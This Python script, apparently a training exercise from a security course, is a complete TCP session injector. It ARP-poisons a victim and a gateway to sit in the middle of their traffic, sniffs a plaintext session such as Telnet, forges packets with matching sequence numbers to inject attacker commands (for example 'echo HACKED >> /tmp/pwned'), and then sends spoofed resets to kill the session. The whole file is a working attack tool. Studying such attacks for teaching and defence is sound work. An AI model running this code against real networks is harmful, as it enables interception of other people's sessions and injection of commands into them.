#!/usr/bin/env python3
"""
Module 4 — Exercise 4-A: TCP Session Injector

Positions attacker as MitM (using ARP poisoning), sniffs for an
established plaintext TCP session (e.g., Telnet, netcat, HTTP),
then injects attacker-controlled data into the stream.

Attack flow:
  1. ARP poison victim + gateway (using module3/arp_mitm logic)
  2. Sniff for TCP session on target port
  3. Capture seq/ack numbers from observed packets
  4. Inject forged packet with correct 5-tuple and seq/ack
  5. Send RST to both sides to clean up

IMPORTANT: This attack requires a plaintext protocol. It will corrupt
encrypted sessions (TLS) but not usefully inject data into them.

Usage:
  sudo python3 module4/tcp_injector.py \
      --victim 10.0.0.2 \
      --gateway 10.0.0.254 \
      --port 23 \
      --payload "echo HACKED >> /tmp/pwned\n" \
      --iface eth0
"""

import argparse
import sys
import threading
import time

from scapy.all import (
    Ether, IP, TCP, ARP, Raw,
    sendp, srp1, send, sniff, AsyncSniffer,
    conf,
)

sys.path.insert(0, "..")   # allow importing from sibling modules if needed

conf.verb = 0

# Shared session state
session = {
    "found": False,
    "src_ip": None, "src_port": None,
    "dst_ip": None, "dst_port": None,
    "next_seq": None, "next_ack": None,
}
session_lock = threading.Lock()


# ── ARP helpers (condensed from module3) ─────────────────────────────────────

def get_mac(ip: str, iface: str) -> str:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    reply = srp1(pkt, iface=iface, timeout=3, verbose=False)
    if not reply:
        raise RuntimeError(f"Cannot resolve MAC for {ip}")
    return reply[ARP].hwsrc


def poison(target_ip, target_mac, spoof_ip, iface):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, real_ip, real_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    sendp(pkt, iface=iface, count=5, inter=0.1, verbose=False)


# ── Session sniffer ────────────────────────────────────────────────────────────

def session_callback(pkt, victim_ip: str, target_port: int):
    """Watch for TCP packets to/from victim on target_port and track seq/ack."""
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    tcp = pkt[TCP]
    ip  = pkt[IP]

    # Match sessions involving victim on target_port
    if not (
        (ip.src == victim_ip and tcp.dport == target_port) or
        (ip.dst == victim_ip and tcp.sport == target_port)
    ):
        return

    # Skip SYN/RST/FIN — we want established data flow
    if tcp.flags & 0x04 or tcp.flags & 0x01:
        return
    if tcp.flags == 0x02:
        return

    with session_lock:
        if not session["found"]:
            # First time we see this session
            if ip.src == victim_ip:
                session["src_ip"]   = ip.src
                session["src_port"] = tcp.sport
                session["dst_ip"]   = ip.dst
                session["dst_port"] = tcp.dport
            else:
                session["src_ip"]   = ip.dst
                session["src_port"] = tcp.dport
                session["dst_ip"]   = ip.src
                session["dst_port"] = tcp.sport

            session["found"] = True
            print(f"\n[+] Session found: {session['src_ip']}:{session['src_port']} "
                  f"→ {session['dst_ip']}:{session['dst_port']}")

        # Always update seq/ack from victim's outgoing packets
        if ip.src == victim_ip:
            payload_len = len(pkt[Raw].load) if pkt.haslayer(Raw) else 0
            session["next_seq"] = tcp.seq + payload_len
            session["next_ack"] = tcp.ack


# ── Injection ─────────────────────────────────────────────────────────────────

def inject_payload(payload: bytes):
    """Forge a TCP packet with the victim's current sequence numbers."""
    with session_lock:
        if not session["found"] or session["next_seq"] is None:
            print("[-] Session state not ready for injection")
            return False

        inject_pkt = (
            IP(src=session["src_ip"], dst=session["dst_ip"])
            / TCP(
                sport=session["src_port"],
                dport=session["dst_port"],
                flags="PA",                # Push + Ack
                seq=session["next_seq"],
                ack=session["next_ack"],
            )
            / Raw(load=payload)
        )

    send(inject_pkt, verbose=False)
    print(f"[+] Injected {len(payload)} bytes: {payload!r}")

    # Advance the local seq counter to prevent collision
    with session_lock:
        session["next_seq"] += len(payload)

    return True


def kill_session():
    """Send RST to both sides to tear down the session cleanly."""
    with session_lock:
        if not session["found"]:
            return

        # RST to server (spoofed as victim)
        rst_fwd = IP(src=session["src_ip"], dst=session["dst_ip"]) / TCP(
            sport=session["src_port"], dport=session["dst_port"],
            flags="R", seq=session["next_seq"],
        )
        # RST to victim (spoofed as server)
        rst_bwd = IP(src=session["dst_ip"], dst=session["src_ip"]) / TCP(
            sport=session["dst_port"], dport=session["src_port"],
            flags="R", seq=session["next_ack"],
        )

    send([rst_fwd, rst_bwd], verbose=False)
    print("[+] RST sent to both sides — session torn down")


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="TCP session injector via ARP MitM")
    parser.add_argument("--victim",  required=True)
    parser.add_argument("--gateway", required=True)
    parser.add_argument("--port",    type=int, required=True, help="Target TCP port to watch")
    parser.add_argument("--payload", default="echo INJECTED\n", help="Data to inject")
    parser.add_argument("--iface",   default=conf.iface)
    parser.add_argument("--no-arp",  action="store_true",
                        help="Skip ARP poisoning (if already in-path)")
    args = parser.parse_args()

    payload_bytes = args.payload.encode().decode("unicode_escape").encode()

    # Enable IP forwarding
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[*] IP forwarding enabled")
    except Exception as e:
        print(f"[!] Could not enable IP forwarding: {e}")

    victim_mac  = None
    gateway_mac = None
    stop_arp    = threading.Event()

    if not args.no_arp:
        print("[*] Resolving MACs...")
        victim_mac  = get_mac(args.victim,  args.iface)
        gateway_mac = get_mac(args.gateway, args.iface)
        print(f"[+] Victim:  {args.victim}  {victim_mac}")
        print(f"[+] Gateway: {args.gateway} {gateway_mac}")

        def arp_loop():
            while not stop_arp.is_set():
                poison(args.victim, victim_mac, args.gateway, args.iface)
                poison(args.gateway, gateway_mac, args.victim, args.iface)
                stop_arp.wait(2)

        arp_thread = threading.Thread(target=arp_loop, daemon=True)
        arp_thread.start()
        print("[*] ARP poisoning active...")
        time.sleep(2)   # let poison propagate

    # Start session sniffer
    bpf = f"tcp and host {args.victim} and port {args.port}"
    sniffer = AsyncSniffer(
        iface=args.iface,
        filter=bpf,
        prn=lambda p: session_callback(p, args.victim, args.port),
        store=False,
    )
    sniffer.start()
    print(f"[*] Watching for TCP session on port {args.port}... (Ctrl-C to abort)\n")

    try:
        # Wait until a session is detected
        deadline = time.time() + 60
        while not session["found"] and time.time() < deadline:
            time.sleep(0.5)

        if not session["found"]:
            print("[-] No session found within 60 seconds")
        else:
            time.sleep(0.5)   # let seq/ack settle
            print(f"[*] Injecting payload: {payload_bytes!r}")
            inject_payload(payload_bytes)
            time.sleep(0.5)
            kill_session()

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    finally:
        sniffer.stop()
        stop_arp.set()

        if not args.no_arp and victim_mac and gateway_mac:
            print("[*] Restoring ARP caches...")
            restore(args.victim,  victim_mac,  args.gateway, gateway_mac, args.iface)
            restore(args.gateway, gateway_mac, args.victim,  victim_mac,  args.iface)
            print("[+] Done")


if __name__ == "__main__":
    main()
